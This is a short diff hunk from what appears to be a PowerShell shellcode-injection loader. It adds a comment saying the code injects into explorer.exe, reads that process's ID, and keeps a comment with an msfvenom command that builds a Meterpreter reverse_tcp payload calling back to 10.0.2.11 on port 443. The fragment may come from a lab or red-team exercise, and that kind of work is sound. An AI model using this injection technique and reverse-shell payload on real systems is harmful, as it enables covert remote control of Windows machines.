@@ -30,6 +30,7 @@ function getDelegateType {
     return $type.CreateType()
 }
 
+# Injects into explorer.exe process
 $procId = (Get-Process explorer).Id
 
 # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.11 LPORT=443 EXITFUNC=thread -f csharp
